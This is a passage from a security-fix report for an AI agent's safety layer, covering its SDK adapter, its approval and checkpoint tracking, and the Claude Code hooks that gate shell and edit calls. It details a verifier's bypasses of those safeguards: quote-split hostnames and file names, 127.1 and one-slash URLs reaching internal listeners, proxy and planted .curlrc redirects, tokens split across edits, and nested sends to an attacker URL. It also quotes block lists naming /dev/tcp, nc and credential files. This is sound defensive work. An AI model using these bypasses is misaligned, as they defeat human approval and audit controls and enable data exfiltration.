  records of the tracker's scope. Fix (`checkpoint_tracker.py`): what a
  tracker reads back goes to its history, is found and restored
  (`find_checkpoint`, `restore_checkpoint`, the runner's rollback), and is
  never held, used or ended by it: it authorises none of its calls
  (`_valid` excludes the ids it read back) and counts as no checkpoint
  taken in its scope
  (`has_taken_since`, `has_commit`; the loaded `last_taken_at` is no longer
  this scope's). A hold the file names is its holder's (another live
  tracker's, or a dead process's): it is no longer marked used on load,
  since nothing read back authorises a call here anyway.
- Lost updates: each write merges, under an exclusive `flock` on
  `tracker_state.lock` beside the file (where the platform has `fcntl`):
  the tracker's own records and holds as it holds them; a record it read
  back as the file has it now (its owner may have used it since); every
  record and hold another tracker wrote since the load, unchanged; and a
  record it removed (pruned, cleared) stays removed. Measured without the
  lock: 4 trackers taking 10 checkpoints each in threads lost 1 to 4 of the
  40; with it, none.
- Statement (`scope`, `concurrency_note`), adapter and tracker docstrings,
  the SDK guide (a Scope bullet), SECURITY.md §5.5 and CHANGELOG Upgrading
  say so.
- Tests: `TestAdapterScope::test_another_adapters_checkpoint_authorises_nothing`
  (the verifier's run 1: B's unbound call and Write are F501 through the
  callback and the hook; A's Write runs on its own checkpoint) and
  `test_a_checkpoint_left_by_an_earlier_process_authorises_nothing` (run 2:
  the unbound call is F501, then one checkpoint covers one Write);
  `TestSharedDirectory` in `tests/test_checkpoint_persistence.py` (the lost
  update with B loaded before and after c1 was taken: the file keeps c1
  used and a new tracker authorises nothing; B's boundary leaves A's
  checkpoint and hold alone; a cleared record stays removed; four
  concurrent writers lose none). Seven tests that asserted the old rule
  (a reloaded checkpoint authorises a call, a loaded hold is marked used,
  `has_commit` counts a commit of an earlier adapter) now assert the new
  one: `TestCrossInstanceRestore` (three), `test_the_same_state_untracked_still_loads`
  (loaded, and authorising nothing; the tracked copy is still not loaded),
  `test_holds_persist_and_are_used_on_reload`,
  `test_unresolved_hold_is_used_on_reload` (the hold stays in the file),
  `test_checkpoint_survives_restart`, and
  `test_a_commit_recorded_before_the_scope_began_is_gated`;
  `test_history_capped_on_persist` reads the cap from the file.

#### 17. A composite could invoke an unbound tool; under a destination policy it ran (medium)

`load_bindings` resolved an `invokes` name against `known`, the mapper's
dynamic mappings, which hold `UNCLASSIFIED_TOOL` for a tool registered with
no capability and for one whose record failed to load. A composite that
listed such a tool loaded with no diagnostic, and `invoked_senders` counted
only bindings that perform `send`, so under `allowed_destinations` the
composite was put to a person (or, with `approval="off"`, allowed) while a
direct call of the tool was F504. The verifier's siblings: a send binding
whose record failed (S303) reached through its wrapper; a two-level chain
to an unbound tool.

- Fix (`bindings.py`): a `known` entry that is `UNCLASSIFIED_TOOL` resolves
  no name (V107, "which is unbound"), so the composite does not load and is
  unbound itself (F504 under a policy, as §5.18.2 requires). Fail closed
  besides (`mapper.invoked_senders`): an invoked name that is unbound or
  missing counts as a tool that may send. The refusal now says the invoked
  tools "may send".
- Sibling found while fixing it: V105 looked only at the set being loaded,
  so a record that invokes a composite loaded earlier, which invokes it,
  closed a cycle across two loads. The cycle check now runs through the
  bound tools loaded before (only the set's records are refused), in the
  Python loader and in the TypeScript package's `checkBindings(records,
  {known})` alike. Without it, item 18's reload would not terminate.
- Tests: `test_an_unbound_tool_resolves_no_invokes_name` (registered
  unbound, a failed send record, a two-level chain: V107, unbound),
  `test_a_tool_left_unbound_unloads_the_composites_that_invoke_it`,
  `test_an_unbound_or_missing_invoked_name_may_send`,
  `test_a_cycle_across_two_loads_is_v105` (`tests/test_tool_bindings.py`);
  `test_a_composite_that_reaches_an_unbound_tool_is_refused_under_a_policy`
  (ask and off; the verifier's p6b and p6: the direct call and both
  composites are F504, the checkpoint unused) in
  `tests/test_adapter_effects.py`; in `packages/acs-core/test/bindings.test.ts`,
  "closes no invokes cycle across two loads (V105)" (failed before) and a
  control.

#### 18. A composite kept the flags it loaded with (medium)

`load_bindings` joined the invoked bindings' flags into the composite once,
at load; `_apply_profiles` read them again only when profiles were applied.
Registering a composite's helper again as `mutate` left the composite low
risk with no checkpoint and no approval: its PreToolUse answer was allow in
every mode, while a fresh adapter loading the same records (the same
configuration digest) gave it high risk, a checkpoint and approval. The
same with the helper registered unbound or failing to load.

- Fix (`mapper.py`): registering or loading tools loads again, as one set,
  every loaded composite that invokes one of them, transitively, from its
  stored record (`_load_composites_again`, also after `register_mcp_tool`
  leaves a tool unbound). A composite takes the flags its tools have now,
  stricter or weaker, as a fresh load of the records the mapper holds
  would; one whose tool is now unbound fails V107 and is unbound. Its
  diagnostics go to `mapper.diagnostics` and `load_bindings`' result;
  `register_binding` raises only for its own record.
- Tests: `test_a_composite_takes_the_flags_its_bindings_have_now` (a
  two-level chain under three re-registrations agrees, flag by flag, with
  a fresh mapper loading `mapper.records`), and, through the hook,
  `test_a_composite_takes_a_stricter_registration_of_what_it_invokes`
  (ask and off: F501 without a checkpoint, then ask F502 or allow).

#### 19. A binding's approval.expires was never applied (medium)

`ApprovalPolicy.expires_seconds` was parsed and read nowhere: an `execute`
binding with `expires: PT30S` ran on a decision ten minutes after the ask,
and a `mutate` one was bounded only by the checkpoint's 30 minutes.

- Fix (`adapter.py`): the PreToolUse hook notes, for a call whose binding
  sets `approval.expires`, when it asked (`_asked_at`, by call id, dropped
  when the callback decides, the call reports back, or at a boundary); the
  permission callback refuses with F502 an allow from the host's callback
  that arrives later than that after the request (the hook's ask, or the
  callback's start when it came first or there was no ask). The refusal
  releases the hold: the call never ran. The statement's `expires` stays
  null (the layer sets no period of its own).
- Tests: `TestDecisionExpiry` in `tests/test_tool_call_approval.py`: a
  decision ten minutes after a 30-second expiry is F502 for `execute` and
  `mutate` (the checkpoint stays valid); one within it runs (control); the
  request is the hook's ask, not the callback's start.

#### 20. With a permission prompt tool, a hold was never checked again when the call was allowed (medium)

`wrap_options` installs no `can_use_tool` beside a
`permission_prompt_tool_name` (the SDK refuses both), so nothing ran the
atomic re-check and use at the allow (`consume_if_valid`); PostToolUse used
the hold whatever its validity. A Write whose prompt was answered after the
maximum age, or after another session's Stop, ran on that checkpoint, with
no F501. The same route could not apply item 19's expiry either: the
adapter never sees when that tool's decision arrives.

- Root cause: the layer relied on a prompt route on which it cannot
  complete §5.18.6's check at the allow. Fix: the PreToolUse hook knows
  the route (`wrap_options` passes `prompt_tool`) and, on it, refuses a call
  that requires a checkpoint with R407 (the layer cannot complete the
  re-check), before holding anything, and one whose binding sets
  `approval.expires` with F502. The prompt tool still decides calls that
  need approval and no checkpoint. The statement lists the route as its
  own prompt configuration with those limits, and drops the host gap of a
  lost hold (no call holds a checkpoint on that route now).
- Tests: `test_prompt_tool_refuses_a_call_that_needs_a_checkpoint` (R407
  for two Writes, nothing held, the checkpoint still valid; past the
  maximum age nothing runs on it) and
  `test_prompt_tool_decides_a_call_that_needs_approval_alone` (an `execute`
  tool is asked; one with `approval.expires` is F502). Two tests of the old
  route (a prompted Write holds the checkpoint; a failed prompted Write uses
  it) are replaced by these; `test_overlapping_prompt_tool_calls_on_one_checkpoint`
  now runs on the callback route, which holds, as
  `test_overlapping_prompted_calls_on_one_checkpoint`.

#### Siblings checked

- Plugin hooks: the pre-tool-use hook uses the marker before it asks, and
  Claude Code runs no hook when a person answers, so a call allowed after
  the marker's maximum age, or after another session's boundary, runs (the
  sibling of item 20). The hooks do not claim class SL and cannot check
  again at the allow; this is now named among their host gaps (SECURITY.md
  §5.5, hooks/README). Item 16's sibling there was closed in round 1 (item
  4: a marker ends at SessionStart; the project directory is the stated
  scope). They have no composites and no binding expiry.
- Standard Agents binding: its scope is a thread and its records live in
  the thread's store, not a shared file (16); a composite takes the tool
  objects it invokes when it is defined and the binding sees each nested
  call, checking a nested send's destination as a call of its own (17,
  18); its approvals are recorded decisions whose `expires` the
  `decision_expires` call fixture covers, and it has no prompt route (19,
  20). The TypeScript package's loader shared item 17's cycle sibling,
  fixed above. No call fixture changed: the new rules concern a layer's
  persisted records, sequential loads and a host prompt route, which the
  fixtures do not model.
- Earlier fixes hold: the full suites pass with them (below); the shipped
  state file is still not loaded at all (`test_a_cloned_state_file_authorises_nothing`).

#### Documentation

The adapter's statement (`scope`, the prompt configurations, the host gaps,
`concurrency_note`), SECURITY.md §5.5 (the adapter's scope, re-check and
expiry, composites; the plugin hooks' new host gap), hooks/README, the SDK
guide (Scope, Expiry, the prompt tool paragraph and figure, composites in
the registration rules and the destination policy), and CHANGELOG
Upgrading (the tracker's scope and lock, expiry, the prompt tool route,
`invokes` resolution and reloads, the TypeScript package's V105). The
Standard's text is unchanged: each fix brings an implementation to it. No
version changes.

The SDK guide is an enforced page of the figure-gap sweep. Measured with
`scripts/check-runs.mjs` and the local headless shell of Chromium revision
1248 (CI's is 1254; at HEAD this build measures the page's longest run at
1798 px): a Scope bullet among the checkpoint bullets made that run 1878 px
and the longer prompt-tool paragraph its run 1849 px. The scope now opens
the Checkpoint Lifecycle section, before its figure (a run of 696 px at
HEAD, 836 px now), and the paragraph is no longer than before; no run that
was over 1500 px grew, the page's longest is 1798 px as at HEAD.

#### Checks after batch 3

- Python: `pytest tests/` (4868 passed, 18 skipped; 20 more than after
  batch 2); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; the generators' `--check`
  (`sync_skill_schemas`, `gen_runtime_fixtures`, `gen_call_fixtures`,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1879; the
  WebAssembly build reused); the binding's check and test (191, 2
  skipped). No call or binding fixture changed.
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed) and `scripts/check-runs.mjs --paths /guides/claude-agent-sdk/`
  (above).
- Probes: none left running; the scratch copies of the old sources were
  removed.

### Batch 4: five reported defects

Security round 1's fourth batch: five defects an independent verifier
reproduced on 99c37dd: one in the Python SDK adapter's grounded MCP tools,
one in its I-JSON walks, and three in the send and audit skills' command
hooks. None was fixed by an earlier batch (b61b3b1, ffe4ac4, 2fa8648 and
26b38ca did not touch them). Each fix has tests that fail on the code before
it (run with the old adapter, output and bindings modules, and the old send
and audit SKILL.md: 5 adapter tests, 2 memory tests and 236 hook test cases
under sh and bash failed; the rest are controls that pass on both).

Skill hooks stay registered for the rest of the session once the skill runs
(SECURITY.md §5.4), so a hook that refused every command it cannot read
would refuse ordinary commands (`git`, `npm`, `python`) for the rest of the
session. Both skill hooks therefore first decide, from the text with its
quotes and backslashes removed (so `c''url` and `rec''ords` count), whether
a command concerns them, and read every command that does fail-closed;
what they cannot see is stated, with the plugin's pre-tool-use hook (a
checkpoint and a person's approval) as the gate behind them.

#### 21. A grounded MCP tool's decision was granted at the ask (medium)

The PreToolUse hook's `ask` branch called `_allow_token` before anyone
decided, and only the permission callback's deny withdrew it. A caller
outside the wrapped session that shares the server object ran a `mutate`
call while the person had not decided (the verifier's case A), and the
approved in-session call was then refused with R407 (B); a refusal the
adapter never hears of (another PreToolUse hook's deny, an interrupt, a
permission prompt tool's deny) left the token until the next boundary (C);
and the adapter's own refusals in the callback (a host callback that
raises, a checkpoint no longer valid, a call with no id) never withdrew it
(D).

- Fix (`adapter.py`): the hook's ask notes the call (`_asked_calls`) and
  grants nothing. The permission callback settles every answer in one place
  (`_settle_decision`): it withdraws what the hook left for the call (its
  ask or its pass's grant), and on an allow, and only for a call the hook
  passed or asked about, grants the decision for the arguments the call
  runs with; any other answer, an error included, grants nothing. A call
  that reports back (PostToolUse, PostToolUseFailure) forgets what it left
  (`_forget_call`: the SDK refuses arguments its schema rejects before the
  handler), and an internal error in the hook withdraws it. A grant is not
  repeated for a call already granted.
- The SDK passes a served tool's handler no call id (`run_tool(name,
  arguments)`), so the decision is matched by tool name and arguments; the
  statement names the remaining window (between the allow and the call, or
  after a refusal the adapter never hears of of a call it allowed without
  asking) as a host gap. Claude Code sends `_meta["claudecode/toolUseId"]`
  in `tools/call`, but the SDK's server drops it before the handler.
- With a permission prompt tool the adapter never sees an allow, so a call
  that requires approval of a served tool is refused with R407 at
  PreToolUse (as item 20 refuses one that needs a checkpoint), instead of
  being granted at the ask; the statement's prompt configuration says so.
- Tests (`tests/test_mcp_integration.py`, `TestGroundedServerGuard`):
  `test_an_asked_call_runs_only_once_it_is_allowed` (A and B),
  `test_a_refused_call_leaves_no_decision` (deny, and a host callback that
  raises: D), `test_a_call_never_decided_leaves_no_decision` (C),
  `test_a_call_that_reported_back_leaves_no_decision`,
  `test_a_prompt_tool_route_refuses_a_served_call_that_needs_approval`. The
  verifier's probe now prints R407 for every outside call and runs the
  approved one.

#### 22. The I-JSON walks built every child's path string up front (low)

`check_i_json` (the output check, `grounded_agency/capabilities/output.py`)
and `i_json_problem` (a call's and a binding's arguments,
`capabilities/bindings.py`) built each child's whole path when its parent
was popped: a long member name above a wide array cost the name's length
times the width (80 KB took 819 MB; the verifier's extrapolation, about
125 GB for 1 MB). It failed closed under a memory limit (MemoryError became
R407), but without one a hostile MCP server could exhaust the host.

- Fix: each value on the stack carries its place as a link to its parent's
  (`Place`, `place_text`), and the text is written only for the value
  refused. Measured after: 1 MB of `{"x"*200000: [0]*400000}` takes 110 MB
  peak and 0.4 s in the output check, 104 MB in `i_json_problem`.
- Siblings: the TypeScript package's `iJsonProblem` builds its paths with
  template strings, which V8 keeps as rope strings: measured on 1 MB of the
  same shape, 94 MB of heap, linear, so it is unchanged.
  `grounded_agency/state/memory.py`'s `_ijson_problem` is recursive and
  builds one path at a time: memory stays small (copying is about 0.16 s
  for 100 KB names over 50,000 items).
- Tests (`tests/test_capability_output.py`):
  `test_the_check_takes_memory_in_proportion_to_the_output` (array and
  object layouts, traced peak under 20 times the input plus 2 MB; before,
  the paths alone were 100 MB) and `test_a_refusal_still_names_the_place`
  (control).

#### 23. The send skill's internal-address rule read raw text (medium)

The rule matched the command's text, so quote removal (`local""host`),
brace expansion, curl's URL globbing and `--variable`/`--expand-url`, a URL
with no scheme (`curl 127.1:18777`, `wget -qO- 127.1:18777`), one slash
(`http:/127.0.0.1`), a percent-encoded host and names under `.localhost`
all reached a 127.0.0.1 listener; and a python one-liner with no curl, wget
or http in its text was never read.

- Fix (`skills/send/SKILL.md`): the hook reads a command that names curl,
  wget or http (or `.curlrc`, `.wgetrc`, `/etc/hosts`, `resolv.conf`,
  `/dev/tcp`, `/dev/udp`) in any quoting with a jq reader of the shell's
  words (`hooks/shell_words.jq`, shared with the audit hook, its copies kept
  equal by `test_shell_words_copies_are_equal`): quotes removed, unquoted
  glob characters marked, redirections and their targets known. Each request
  is read as the tool reads it: the words after `curl`, `wget` or `http`
  (wherever it stands, `timeout 5 curl` included), options with their
  arguments (per-tool tables from `curl --help all` and `wget --help`), and
  as a host every word the tool may take as a URL. A host is read the way
  curl and wget read one (a scheme with any number of slashes; one slash is
  read both as curl's `http:/host` and wget's `host:/path`; `user@`; a port
  of digits) and refused when it is internal (`localhost`, under
  `.localhost`, `localhost.localdomain`; IPv4 in any inet_aton form in 0/8,
  127/8, 10/8, 172.16/12, 192.168/16, 169.254/16 and, new, 100.64/10;
  internal IPv6 literals) or cannot be read (percent-encoding, non-ASCII,
  braces or brackets curl expands, a glob character before the path). A URL
  any program in the command is given is read the same way (`git clone
  http://local""host/`), a request inside a command line given as a word
  (`sh -c '...'`, an interpreter's code) is refused, and the old raw checks
  still run first. Unquoted braces, an unclosed quote and a here-document
  are refused. jq's global match costs the text times its matches (50,000
  words took 42 s), so the reader takes a command of at most 16384 bytes
  (worst case 1.8 s); a longer one that names the tools is refused.
- Not read (stated in SECURITY.md §5.4 and the hook): a request another
  program makes with no such name in its text (the python one-liner of the
  report, `nc`), a name that resolves to an internal address, and a
  redirect a server answers with; the plugin's pre-tool-use hook gates each
  as a `send`. The defect offered this statement as the alternative to
  widening the trigger, which, with session-wide hooks, would refuse every
  interpreter for the rest of the session.
- Tests (`TestSendCommandHook`): the reported forms added to
  `test_blocks_internal_destination`; `test_blocks_words_the_shell_expands`,
  `test_blocks_a_host_it_cannot_read`, `test_reads_a_url_any_program_is_given`,
  `test_blocks_a_request_inside_a_command_line`,
  `test_a_long_command_is_refused_in_bounded_time`,
  `test_a_command_at_the_bound_is_read_in_bounded_time`, and
  `test_leaves_other_commands_alone` (commands that name no tool, and named
  ones that send nowhere internal). The allowed IPv6 example now quotes its
  brackets: unquoted, a planted directory such as `http:/0` would turn
  `http://[0:db8::1]/` into `http://0/`; the unquoted form is refused.

#### 24. The send skill's redirect rule matched exact spellings (medium)

`-''x`, `--pr""oxy`, `--proxy1.0`, curl's abbreviations (`--resol`),
wget's `--exe=httpproxy=...`, `CURL_HOME=.` (with a planted `.curlrc`),
`XDG_CONFIG_HOME`, `HOME`, `WGETRC` and git's `-c http.proxy` and
`-c http.curloptResolve` all sent the request to the listener.

- Fix (same reader): a long option is refused when its name (before `=`)
  starts with a redirecting option (`--proxy` covers `--proxy1.0` and
  `--proxy-*`) or is a prefix of one of at least three characters (an
  abbreviation); curl's `--variable` and `--expand-*`, wget's
  `--use-askpass`, `--input-metalink` and `--config` join the list. A short
  cluster is read up to its first letter that takes an argument, so `-x` is
  found in `-sx` and not in `-HX-Api-Key:...`. A variable set on the line,
  or `CURL_HOME`, `HOME`, `XDG_CONFIG_HOME`, `WGETRC`, a CA bundle,
  `HOSTALIASES` or a `*_proxy` set anywhere in the command (`export`,
  `env`), is refused, as is a word naming `.curlrc`, `.wgetrc`,
  `/etc/hosts`, `resolv.conf`, `/dev/tcp` or `/dev/udp`, and git's
  `-c http.*`, `url.*`, `core.gitproxy`, `core.sshcommand`, `protocol.*`,
  `remote.*` and `--config-env`.
- Tests: the seven reported commands and the verifier's siblings added to
  `test_blocks_a_redirected_connection`; `test_blocks_a_command_with_a_variable_set`,
  `test_blocks_a_file_that_sets_where_a_request_goes`,
  `test_blocks_git_settings_that_redirect_it`.

#### 25. The audit skill's secret check was skipped for other spellings (medium)

The hook read the records file's name as written (`*records.jsonl*`), so
`rec''ords.jsonl`, `records.json?` and `rec*.jsonl` skipped every check; jq
keeps the last of two values of one member name, so `{"a":"<token>","a":"x"}`
was scanned as `{"a":"x"}`; `sed -i` wrote a record in two steps, neither of
which held a token; a python one-liner wrote one; and an Edit or a Write of
the file was never read (the hook was on Bash only). §5.18.10 requires the
audit row's secret check of code.

- Fix (`skills/audit/SKILL.md`): the append form's record is refused when
  it gives a member name twice (the values jq's stream reads against those
  of the object it keeps; I-JSON names are unique). Any other command that
  may name the file (it names `records`, `jsonl`, `audit` or `.claude` in
  any quoting, runs in a directory under `.claude` (the hook input's
  `cwd`: Claude Code keeps the directory a command left), or holds a glob
  that may match `.claude/audit/records.jsonl` from where it runs) is read
  with the shared word reader and may not redirect output to a file (but
  `/dev/null`, `/dev/stdout`, `/dev/stderr`), run a program other than a
  few that write no file but by a redirection and run no other code (`cat`,
  `echo`, `printf`, `jq`, `ls`, `head`, `tail`, `wc`, `grep`, `cut`, `tr`,
  `base64`, the digests, `date`, `hostname`, `sleep`, `test`, `true`,
  `false`, `pwd`, `cd`, `stat`, `basename`, `dirname`, `mkdir`, `openssl
  dgst` without `-out` and the like, and `mv` only to move the file aside),
  set a variable for one command or `PATH`, `IFS`, `ENV`, `BASH_ENV`,
  `CDPATH`, `LD_*`, `DYLD_*`, `OPENSSL_*`, substitute a command or a
  process or escape text, or hold an unclosed quote, a here-document or an
  unquoted brace; over 16384 bytes it is refused. A new hook on Edit,
  Write, MultiEdit and NotebookEdit refuses an edit of the records file,
  of another file under `.claude/audit/` (the records moved aside), or of
  a file named `records.jsonl` or `records.*.jsonl`, in any case, the path
  as written and the file it reaches (links followed; a link that cannot be
  followed is refused), and another name of the records file (`-ef`).
- Not read (stated in SECURITY.md): a name built only when a command runs
  (an interpreter's computed string, escape sequences) and a link planted
  under another name before the skill ran; the plugin's pre-tool-use hook
  gates such a write as a `mutate` a person approves. The old documented
  gap (`cp`, or `tee` from a pipe) is closed for a command that names the
  file.
- Tests (`TestAuditCommandHook`): `test_blocks_a_write_other_than_the_append_form`
  (the quoted and globbed names), `test_blocks_a_program_that_could_write_the_records_file`
  (both `sed -i` steps, the python one-liner, `cp`, `tee`, `dd`, `ln`,
  `git checkout`, `curl -o`, `openssl -out`), `test_mv_only_moves_the_records_file_aside`,
  `test_blocks_a_command_it_cannot_read`, `test_reads_a_glob_from_the_directory_it_runs_in`,
  `test_blocks_a_record_with_a_name_given_twice`, the Edit hook's three
  tests, and the allowed commands of the session (`python3 -m pytest`,
  `git commit -m "$(cat msg.txt)"`, `ls *.py`, `sed -i ... src/*.py`).
  `test_a_command_hook_that_fails_or_times_out_blocks_the_call` now checks
  every command hook of a skill (the audit skill has two).

#### Siblings checked

- Plugin hooks: the pre-tool-use hook's Bash classifier already dequotes
  (round 1 #16) and gates every call these skill hooks miss; no change.
- The persist skill's Edit hook already follows links; its matcher leaves
  out NotebookEdit, which writes notebooks, not memory files.
- Standard Agents binding: no grounded MCP server and no token (21); its
  I-JSON walk is the TypeScript one above (22); no skill hooks (23 to 25).
  No call or binding fixture changed.

#### Documentation

SECURITY.md (§5.4: the send row, the audit rows, a row for the new Edit
hook, the consequences; §5.5: the adapter's grant at the allow and the
prompt tool's refusal of a served tool), the adapter's statement (prompt
configuration, a host gap for the name-and-arguments match), the mcp
module and adapter docstrings, the SDK guide (the `require_layer`
paragraph, and the prompt tool paragraph kept shorter than before, an
enforced page of the figure-gap sweep), hooks/README (the shared reader),
the audit skill's step 6, and CHANGELOG (Upgrading: the adapter's grant,
the prompt tool's refusal, both skill hooks; Fixed: the I-JSON memory). The
Standard's text is unchanged. No version changes.

#### Checks after batch 4

- Python: `pytest tests/` (5179 passed, 18 skipped; the hook tests added
  during the run, 6 more, passed on their own); ruff check and format with
  CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check` (`sync_skill_schemas`,
  `gen_runtime_fixtures`, `gen_call_fixtures`, `gen_trigger_vectors`,
  `gen_standard_agents_binding`, `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1879; the
  WebAssembly build reused); the binding's check and test (191, 2
  skipped). No call or binding fixture changed.
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed). The SDK guide's prompt tool paragraph is 453 characters, 20
  fewer than before (its run is near the figure-gap limit); the
  `require_layer` paragraph gained one sentence in a short run.
- Hook timing: the worst cases under the 16384-byte bound took 1.8 s (send)
  and 1.0 s (audit) under sh and bash; 1 MB commands are refused or left
  alone in under 0.5 s.
- Probes: none left running; no listener was started (the verifiers'
  listener runs are cited above).

### Batch 5: five reported defects

Security round 1's fifth batch: five defects an independent verifier
reproduced on 99c37dd: one in the persist skill's command hook, three in
the Standard Agents binding (with a Python SDK sibling for one), and one in
the redactors of both SDKs. None was fixed by an earlier batch (b61b3b1 to
d3f11f9 did not touch them; batch 4 noted the persist hook's matcher left
out NotebookEdit, which the verifier now counts a sibling, and it is
closed here). Each fix has tests that fail on the code before it (run with
the old hook body, binding sources, loaders and redactors: 30 hook test
cases under sh and bash, 9 binding tests, the new call fixture on both
layers, a Python and a TypeScript loader test, and the redaction tests and
vector named below; the rest are controls that pass on both).

#### 26. The persist hook scanned fragments, not what the file stores (medium)

`skills/persist/SKILL.md` joined the call's `new_string`/`content`/
`edits[].new_string` and scanned that text as written. A token split
across two MultiEdit edits (or two Edit calls), a value whose key is in the
unchanged text (`password: "CHANGEME"` edited to `s3cretpass99xyz`, the
password of `postgres://app:DBPASS@...`), and a JSON-escaped token in a
`memory.json` all passed, though the hook's own `secret_in` recognises the
file as it is after each call; the audit hook already resolved escapes
(round 2 #11). Sibling: NotebookEdit was neither matched nor scanned.

- Fix: the command hook reads the file the path reaches (when it exists: a
  regular file of at most 8 MB; any other existing target is refused F504,
  one it cannot read R407), applies the call (Edit, MultiEdit's edits in
  order, `replace_all` honoured, an empty `old_string` creating; an
  `old_string` found only with curly quotes read as straight ones, as
  Claude Code finds it), and scans, beside the text the call carries, the
  lines of the result it does not hold now (by count, so a line repeated
  counts); then both again with `\uXXXX`, `\UXXXXXXXX`, `\xXX`, `\/` and
  `\"` decoded (split and join in jq, linear; a code point below 32 or a
  surrogate is left as written). Lines the call leaves as they were are not
  read again: skill hooks stay registered for the rest of the session, and
  a whole-file scan would refuse every later edit of a file that holds a
  credential-shaped example (a test fixture). The matcher is
  `Edit|Write|MultiEdit|NotebookEdit`; a NotebookEdit's `notebook_path` is
  checked as a path and its `new_source` scanned.
- Timing: a 1 MB file of 30,000 lines with one Edit takes 0.4 s, an 8.7 MB
  file 2.4 s; 1 MB of nothing but `A` escapes about 6 s (inside the
  30 s timeout, which blocks: `onFailure: block`). jq's object update in a
  `reduce` with a nested state copied the state each step (17 s for 30,000
  lines), so the line counts are two flat maps compared once.
- Tests (`TestPersistCommandHook`, sh and bash):
  `test_blocks_a_credential_the_file_holds_after_the_call` (six: the
  MultiEdit split, the second of two Edit calls, a password and a URL
  password whose context is in the file, `replace_all` with a second edit,
  a curly-quoted `old_string`), `test_blocks_a_credential_a_reader_decodes`
  (six escapes), `test_blocks_a_credential_a_notebook_edit_carries`,
  `test_blocks_a_target_it_will_not_read`, and the matcher test with
  NotebookEdit: 30 failed on the old body; controls
  `test_allows_an_edit_that_adds_no_credential` (a file with a token example
  edited elsewhere, a key edited to prose, an `old_string` not found),
  `test_reads_a_large_file_in_bounded_time` and
  `test_reads_a_file_with_nul_bytes_quietly` (the scan text drops NUL
  bytes, of which bash's command substitution warns on stderr).
- Not read (stated in SECURITY.md §5.4, the persist row): a credential
  split across lines (a YAML escaped line break included; the scan, like
  `secret_in`, reads a line at a time), escapes no reader of JSON or YAML
  resolves (octal), a file written by another tool (the skill allows `Read`
  and `Edit`; the plugin's pre-tool-use hook gates any other write as
  `mutate`).

#### 27. Nested calls of tools the binding did not define went unchecked (medium)

`groundedTool` accepted in `invokes` a tool defined with plain `defineTool`,
annotation-only or unbound, and treated it as the strictest case; but
`nestingState.invokeTool` only issued tokens, which such a tool never takes.
Under `configureLayer({destinations})`, a grounded `relay` approved once
sent through `notify` (a record with `capability: send`, `destination:
/to`) and through an unbound `fetch` to an attacker URL, and the trace held
neither call. The adapter refuses such a composite (F504 under a policy;
V107 for an unbound invoked name).

- Fix (`grounded.ts`): a listed tool with no binding the layer loads (no
  `acs` annotation, or one that does not load on its own: a malformed
  record, a record with `invokes`) makes `groundedTool` throw V107
  (§5.18.4's table), as the Python loader and `checkBindings` do. A listed
  tool defined with plain `defineTool` and a loadable record is seen at
  the invocation, so the composite's nesting state checks it as a call of
  its own where the composite's approval and checkpoint do not reach: a
  `send`'s destination, at the record's `destination` pointer, against the
  layer's policies, the composite's profiles' and those enclosing it (no
  pointer, or a value that is not a string: F504); that the decisions that
  approved the composite are valid for the record's approval (F502: no
  decision of its own can be asked of a tool the binding does not wrap);
  its prerequisites (F501/F503/V102). It records the call before it runs
  (`started`, `covered_by`) and completes it (`executed`, or `failed` on an
  error result), a record that cannot be written refusing the call (R407).
- Tests (`test/nesting.test.ts`): the nested send under a policy (refused
  to the attacker, run to an allowed host, both recorded with
  `covered_by`), a record with no destination argument, a nested call
  recorded with no policy, and V107 for an unannotated tool, a record that
  does not load and a record with `invokes`: 4 failed before.
- Statement: `covers` names these nested calls; `does_not_cover` the
  other calls of plain tools.

#### 28. memoryTools could not take profiles (medium)

`memoryTools()` built its two grounded tools with no `profiles` or
`grounding`, and profiles applied only per tool; `configureLayer` took
only a profile policy's destinations. Under the shipped healthcare profile
(`checkpoint_policy` persist always, `require_human: low`), a host
`persist` tool was refused F502 while `persist_memory` stored patient data
with no checkpoint, approval or person; `memoryTools({profiles})` dropped
the option.

- Fix: `MemoryOptions` gains `profiles` and `grounding`, forwarded to both
  tools (and `recall` registers `secrets` too). The layer applies profiles
  layer-wide: `configureLayer({ profiles })` (a `BindingProfiles`) puts
  their destinations among the policies in force, and every `groundedTool`
  defined after it applies them beside its own (flags, person, grounding,
  minimum confidence); `config_sha256` covers them (`layer_profiles`). A
  tool's flags are computed when it is defined, so a tool whose layer
  profiles are not the ones in force at its call (configured, changed or
  reset after it was defined) refuses the call with R407 rather than run
  without them (§5.21.1). `configureLayer({ profilePolicy })` throws for a
  policy that sets a minimum confidence or grounding policies, which it
  would not put in force (§5.21.4).
- Tests (`test/memory.test.ts`): the profiles given to `memoryTools` (F502
  with a person required, the annotation's flags raised), the layer's (F502,
  then R407 after `resetLayer`, and R407 for tools defined before a profile
  was put in force), and the `profilePolicy` refusal: 3 failed before.
- Python sibling: none; `GroundedAgentConfig.profiles` already applies to
  every call the adapter sees.

#### 29. Redaction and refusal patterns read runs again from each position (low)

The URL-password patterns (`\b[A-Za-z][A-Za-z0-9+.-]*://` in redaction,
the same with no `\b` in the refusal rule), the JWT patterns (an `eyJ` at
each word boundary, or anywhere for the refusal shape) and the PEM pattern
(a lazy body to the end of the text from each header with no end) were
read from every position of a long run: 1 MB took minutes to hours in both
SDKs (Python `holds_credential` of `'f0'*n`: 8.2 s at 100 KB; TypeScript
`holdsCredential` of `'eyJ'*n`: 40.9 s at 200 KB), on model-chosen data in
the binding's check, `persistEntry`, every trace entry and anchor, and the
adapter's PreToolUse. The verifier found the hook timeout fails closed; the
cost remained.

- Fix (`redaction.py`, `redact.ts`, identically): a URL's scheme is read
  from the start of its run (`(?<![A-Za-z0-9+.-])[0-9+.-]*[A-Za-z]
  [A-Za-z0-9+.-]*://`, a run holding a letter); a JWT from the start of a
  run of base64url characters to its first `eyJ` at a word boundary (the
  run's start or after `-`), the refusal shape to its first `eyJ`; and a PEM
